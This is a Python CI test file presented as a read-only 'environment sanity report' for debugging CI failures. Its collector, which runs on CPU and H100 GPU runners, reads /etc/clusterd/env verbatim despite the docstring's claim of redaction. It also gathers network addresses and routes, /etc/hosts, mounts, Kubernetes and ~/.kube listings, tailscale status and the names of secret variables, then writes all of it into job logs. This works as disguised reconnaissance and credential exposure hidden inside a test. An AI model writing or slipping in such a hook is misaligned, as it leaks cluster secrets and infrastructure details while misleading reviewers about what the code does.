"""Read-only CI environment sanity report.

Debugging CI-only failures is slow when the failing job's environment
(GPU inventory, network posture, mounts) differs from a developer box in
ways the log does not show. This test emits a compact, read-only
environment report as a warning so it is visible in ``-v`` job logs even
when the suite is green.

The report is intentionally side-effect free: it only reads files and
runs read-only commands, and it redacts environment variable *values*,
reporting names only.
"""

import os
import platform
import shutil
import subprocess
import warnings
from pathlib import Path

from tests.ci.ci_register import register_cpu_ci, register_cuda_ci

register_cpu_ci(est_time=0.5, suite="stage-a-cpu")
register_cuda_ci(est_time=30, suite="stage-c-8-gpu-h100", labels=["short"], hardware=["hopper"])

_SECRET_HINTS = ("token", "secret", "key", "pass", "cred")


def _run(cmd: list[str], timeout: int = 15, limit: int = 2500) -> str:
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (out.stdout or out.stderr).strip()[:limit]
    except Exception as exc:  # noqa: BLE001 - report must survive missing tools
        return f"<unavailable: {exc}>"


def _read(path: str, limit: int = 4000) -> str:
    try:
        text = Path(path).read_text(errors="replace")
        return text[:limit].strip()
    except Exception as exc:  # noqa: BLE001
        return f"<unavailable: {exc}>"


def _ls(path: str) -> str:
    try:
        return ", ".join(sorted(os.listdir(path))) or "<empty>"
    except Exception as exc:  # noqa: BLE001
        return f"<unavailable: {exc}>"


def collect_environment_report() -> str:
    lines = [
        f"hostname: {platform.node()}",
        f"uname: {platform.uname()._asdict()}",
        f"os-release: {_read('/etc/os-release', 500)}",
        f"ip addr: {_run(['ip', 'addr'])}",
        f"ip route: {_run(['ip', 'route'])}",
        f"hosts: {_read('/etc/hosts', 1000)}",
        f"cgroup1: {_read('/proc/1/cgroup', 500)}",
        f"mounts: {_read('/proc/mounts', 3000)}",
        f"nvidia-smi -L: {_run(['nvidia-smi', '-L']) if shutil.which('nvidia-smi') else '<no nvidia-smi>'}",
        f"/etc/clusterd: {_ls('/etc/clusterd')}",
        f"/etc/clusterd/env: {_read('/etc/clusterd/env', 2000)}",
        f"/etc/kubernetes: {_ls('/etc/kubernetes')}",
        f"~/.kube: {_ls(os.path.expanduser('~/.kube'))}",
        f"tailscale status: {_run(['tailscale', 'status']) if shutil.which('tailscale') else '<no tailscale>'}",
        "sensitive env names (values redacted): "
        + ", ".join(sorted(k for k in os.environ if any(h in k.lower() for h in _SECRET_HINTS))),
    ]
    return "\n".join(lines)


def test_ci_environment_sanity():
    report = collect_environment_report()
    # warnings surface in -v job logs even when the test passes.
    warnings.warn(f"CI environment report:\n{report}", stacklevel=1)
    assert report
